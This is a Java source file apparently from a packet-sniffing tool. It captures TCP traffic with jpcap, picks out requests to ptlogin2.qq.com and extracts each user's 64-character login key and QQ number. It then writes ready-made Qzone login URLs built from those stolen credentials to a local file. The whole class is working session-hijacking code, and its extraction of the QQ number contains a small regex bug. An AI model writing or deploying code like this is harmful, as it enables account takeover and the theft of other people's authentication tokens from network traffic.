package org.jasic.qzoner.core.handler.proc;
import jpcap.packet.TCPPacket;
import org.jasic.common.DefualtThreadFactory;
import org.jasic.qzoner.core.entity.http.Header;
import org.jasic.qzoner.core.entity.http.HeaderRowPair;
import org.jasic.qzoner.util.ParserUtil;
import org.jasic.utils.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.Executors;
/**
 * User: Jasic
 * Date: 13-9-18
 */
public class TcpProcessor extends AProcessor<TCPPacket> {
    private final static Logger logger = LoggerFactory.getLogger(TcpProcessor.class);
    private final static String logHeader = "TCP处理";
    private Map<String, String> map = new HashMap<String, String>(16);
    private File file = new File("F:/qzone.txt");
    private FileWriter fw;
    private FileReader fr;


    public TcpProcessor() {
        super(Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors(), new DefualtThreadFactory("TCP包处理池")));
    }

    {
        try {
            fw = new FileWriter(file, true);
            fr = new FileReader(file);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    {
        if (!file.exists())
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
    }

    @Override
    public void doProcess(TCPPacket tcpPacket) {
        byte[] date = tcpPacket.data;
        if (date.length > 0) {
            String reqstr = new String(date, Charset.forName("UTF-8"));

            try {
                Header header = ParserUtil.parserHeader(reqstr);
                Map<String, String> pairs = new HashMap<String, String>();
                for (HeaderRowPair pair : header.getPairs())
                    pairs.put(pair.getName(), pair.getValue());
                if (pairs.containsKey("host") && pairs.get("host").equals("ptlogin2.qq.com")) {
                    // /qqmusic_150?uin=499326979&key=46e1727437fb68145f3dc6525aacfe6be4683f899b7dd5e942b225c1a56f69c4&version=9&miniversion=0&pcachetime=1379999461
                    String url = pairs.get(header.getType());
                    String clientKey = StringUtils.getMatch(url, "key=[0-9a-zA-Z]{64}&{0,1}").replace("key=", "").replace("&", "");
                    String clientuin = StringUtils.getMatch(url, "clientuin=[0-9]{6,11}".replace("clientuin=", ""));
                    String qzoneUrl = "http://ptlogin2.qq.com/jump?ptlang=2052&clientuin=" + clientuin + "&clientkey=" + clientKey + "&u1=http%3A%2F%2Fuser.qzone.qq.com%2F" + clientuin + "%2Finfocenter";
                    map.put(clientuin, qzoneUrl);
                    fw.append(qzoneUrl + "\n").flush();
                    System.out.println(url);
                    logger.info(logHeader + qzoneUrl);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
